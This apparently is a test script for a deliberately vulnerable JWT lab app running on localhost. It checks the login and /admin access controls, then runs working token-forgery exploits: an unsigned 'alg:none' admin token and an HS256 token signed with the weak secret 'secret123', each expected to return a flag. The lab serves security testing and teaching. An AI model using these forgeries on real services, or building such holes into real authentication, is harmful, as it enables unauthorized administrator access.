#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

PORT=8081
FAIL=0

# 1. Login returns a token
OUT=$(curl -sf -X POST http://localhost:$PORT/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"password"}')
TOKEN=$(echo "$OUT" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
if [ -z "$TOKEN" ]; then
  echo "[-] FAIL: login did not return token"; FAIL=1
else
  echo "[+] PASS: login returned token"
fi

# 2. User token denied on /admin
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  http://localhost:$PORT/admin \
  -H "Authorization: Bearer $TOKEN")
if [ "$STATUS" = "403" ]; then
  echo "[+] PASS: user token rejected from /admin"
else
  echo "[-] FAIL: expected 403, got $STATUS"; FAIL=1
fi

# 3. alg:none forged admin token returns flag
python3 - <<'PYEOF'
import base64, json, urllib.request, sys

TARGET = "http://localhost:8081"

def b64u(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

h = b64u(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b64u(json.dumps({"username":"admin","role":"admin"}).encode())
token = f"{h}.{p}."

req = urllib.request.Request(f"{TARGET}/admin",
    headers={"Authorization": f"Bearer {token}"})
with urllib.request.urlopen(req) as r:
    data = json.loads(r.read())
flag = data.get("flag","")
if flag.startswith("POC{"):
    print(f"[+] PASS: alg:none bypass worked, flag={flag}")
else:
    print(f"[-] FAIL: alg:none bypass did not return flag: {data}")
    sys.exit(1)
PYEOF

# 4. Forged HS256 with weak secret returns flag
python3 - <<'PYEOF'
import base64, hashlib, hmac, json, urllib.request, sys

TARGET = "http://localhost:8081"
SECRET = "secret123"

def b64u(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
p = b64u(json.dumps({"username":"admin","role":"admin"}).encode())
sig = hmac.new(SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
token = f"{h}.{p}.{b64u(sig)}"

req = urllib.request.Request(f"{TARGET}/admin",
    headers={"Authorization": f"Bearer {token}"})
with urllib.request.urlopen(req) as r:
    data = json.loads(r.read())
flag = data.get("flag","")
if flag.startswith("POC{"):
    print(f"[+] PASS: weak-secret HS256 forgery worked, flag={flag}")
else:
    print(f"[-] FAIL: HS256 forgery did not return flag: {data}")
    sys.exit(1)
PYEOF

if [ "$FAIL" -eq 0 ]; then
  echo "[+] All tests passed"
  exit 0
else
  echo "[-] One or more tests failed"
  exit 1
fi
